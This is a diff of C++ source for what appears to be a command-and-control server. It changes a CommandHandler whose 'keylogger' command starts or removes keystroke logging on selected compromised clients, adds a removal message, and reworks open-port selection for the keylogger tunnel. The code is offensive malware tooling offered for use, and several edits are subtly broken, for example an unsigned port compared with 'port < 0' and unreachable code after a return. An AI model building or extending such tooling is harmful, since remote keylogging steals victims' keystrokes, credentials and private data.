@@ -68,8 +68,8 @@ CommandHandler::CommandHandler(
     std::atomic<bool>* __p_shutdown_flag,
     std::string* __p_ip,
     uint __port,
-    int* __p_user_verbosity,
-    int __shutdown_event_fd): p_ip_(__p_ip),port_(__port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity), shutdown_event_fd_(__shutdown_event_fd) {
+    int* __p_user_verbosity
+    ): p_ip_(__p_ip),port_(__port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity) {
     
 
     argument_list_.push_back(Argument(INDEX_ARG, ARG_TYPE_INT, "-i", "--index"));
@@ -112,7 +112,7 @@ CommandHandler::CommandHandler(
         {HELP_ARG}
     ));
     command_map_.emplace("keylogger", Command(
-        "Start listening the key logs of the selected client. Usage: keylogger -i <client_index>",
+        "Start listening the key logs of the selected client. Usage: keylogger -i <client_index>\nUse -rm to remove the keylogger from the client",
         &CommandHandler::keylogger,
         this,
         {HELP_ARG, REMOVE_ARG},
@@ -202,7 +202,7 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
     }
 
     if (temp_arg_map.find(HELP_ARG) != temp_arg_map.end()) {
-        *p_event_log_ << LOG_MUST << CYAN << __root_cmd << " " << command.description_ << RESET;
+        *p_event_log_ << LOG_MUST << CYAN << __root_cmd << " " << command.description_ << RESET_C2_FIFO;
         return HELP_ARG;
     }
 
@@ -359,8 +359,12 @@ void CommandHandler::keylogger() {
         *p_event_log_ << LOG_MUST << RED << "Client " << client_index << " is not available" << RESET_C2_FIFO;
         return;
     }
-    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) {
-        // Remove the keylogger
+    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // Remove the keylogger
+        
+        send_client(KEYLOGGER, 0, client_index);
+        *p_event_log_ << LOG_MUST << MAGENTA << "Removing keylogger port: " << 0 << RESET_C2_FIFO;
+        return;
+
         rc = p_clients_->at(client_index)->unset_tunnel(KEYLOGGER);
         if (rc < 0) {
             *p_event_log_ << LOG_MUST << RED << "Keylogger is not active" << RESET_C2_FIFO;
@@ -370,10 +374,11 @@ void CommandHandler::keylogger() {
         }
     } else {
         uint port = find_open_port();
-        if (port < -1) {
-            *p_event_log_ << LOG_MUST << RED << "Failed to find an open port for keylogger" << RESET_C2_FIFO;
+        if (port < 0) {
             return;
         }
+        
+        *p_event_log_ << LOG_MUST << MAGENTA << "Keylogger port: " << port-port_ << RESET_C2_FIFO;
         Keylogger* p_keylogger = new Keylogger();
         if (p_keylogger == nullptr) {
             *p_event_log_ << LOG_MUST << RED << "Failed to allocate memory for Keylogger" << RESET_C2_FIFO;
@@ -393,17 +398,18 @@ void CommandHandler::keylogger() {
     
 }
 
-int CommandHandler::find_open_port() {
+uint CommandHandler::find_open_port() {
     int sockfd;
-    sockaddr_in addr{};
+    struct sockaddr_in addr;
 
-    for (int port=port_+1;port<65535;port++) {
+    for (uint port=port_+1;port<65535;port++) {
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
         if (sockfd < 0) {
-            *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::find_open_port] Error creating socket: " << strerror(errno) << RESET;
+            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::find_open_port] Error creating socket: " << strerror(errno) << RESET;
             return -1;
         }
 
+        memset(&addr, 0, sizeof(addr));
         addr.sin_family = AF_INET;
         addr.sin_addr.s_addr = INADDR_ANY;
         addr.sin_port = htons(port);
@@ -417,6 +423,9 @@ int CommandHandler::find_open_port() {
         }
         close(sockfd);
     }
+    *p_event_log_ << LOG_MUST << RED 
+        << "[CommandHandler::find_open_port] Failed to find an open port in range " 
+        << port_ + 1 << "-65534 ==> " << strerror(errno) << RESET_C2_FIFO;
     return -1;
 }
 
